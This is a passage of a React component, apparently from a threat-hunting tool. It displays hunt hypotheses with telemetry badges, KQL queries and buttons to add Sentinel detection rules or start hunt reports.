                        <SectionLabel>Telemetry</SectionLabel>
                        <div className="flex flex-wrap gap-1.5">
                          {h.requiredTelemetry.map((ds) => (
                            <Badge key={ds} tone={hasTelemetry(currentClient.primaryTelemetry, ds) ? 'success' : 'warning'}>
                              {ds}
                            </Badge>
                          ))}
                        </div>
                      </div>
                    </div>
                    <CodeBlock code={h.unifiedQuery} label="KQL" maxHeight="max-h-60" />
                    <p className="break-words text-xs text-fg-subtle">
                      <span className="text-fg-muted">Looks like:</span> <span className="font-mono">{h.expectedPattern}</span>
                    </p>
                    <div className="flex flex-wrap justify-end gap-2">
                      <Button
                        size="sm"
                        icon={ShieldCheck}
                        onClick={() =>
                          sendToDetections({
                            ruleName: h.hypothesisTitle.replace(/^Hunt for /, '').slice(0, 80),
                            queryLogic: h.unifiedQuery,
                            techniqueIds: [h.techniqueId],
                            tactics: [h.tactic],
                            description: h.hypothesisTitle,
                            platform: 'Microsoft Sentinel (KQL)',
                          })
                        }
                      >
                        Add as detection rule
                      </Button>
                      <Button
                        size="sm"
                        variant="primary"
                        icon={FileText}
                        onClick={() =>
                          startReport({
                            hypothesisTitle: h.hypothesisTitle,
                            hypothesisDescription: h.rationale,
                            techniqueIds: [h.techniqueId],
                            dataSources: h.requiredTelemetry,
                            queryLanguage: 'KQL',
                            queryText: h.unifiedQuery,
                            notes: `Threat actors: ${h.threatActors.join(', ')}. Expected pattern: ${h.expectedPattern}`,
                          })
                        }
                      >
                        Start hunt report
                      </Button>
                    </div>
                  </div>
                </Card>
              );
            })
          )}
        </div>
      </div>
    </>
  );
};
